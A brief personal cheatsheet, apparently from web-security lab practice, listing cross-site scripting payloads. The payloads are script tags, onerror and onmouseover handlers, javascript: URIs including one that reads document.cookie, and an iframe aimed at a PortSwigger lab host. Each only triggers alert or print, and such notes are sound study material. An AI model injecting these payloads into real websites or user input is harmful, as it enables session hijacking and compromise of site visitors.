---
aliases:
tags:
  - type/cheatsheet
  - vuln/xss
  - asset/web-app
  - estado/incompleto
primary categories:
secondary categories:
tertiary categories:
linked:
---


```js
<script>alert(window.origin)</script>
<img src="" onerror=alert(window.origin)>
javascript:alert(document.cookie)
<iframe src="https://0a7a000803b4b69f80ea0d7e00d3004e.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
"onmouseover="alert(1)
javascript:alert(1)
'-alert(1)-'
```

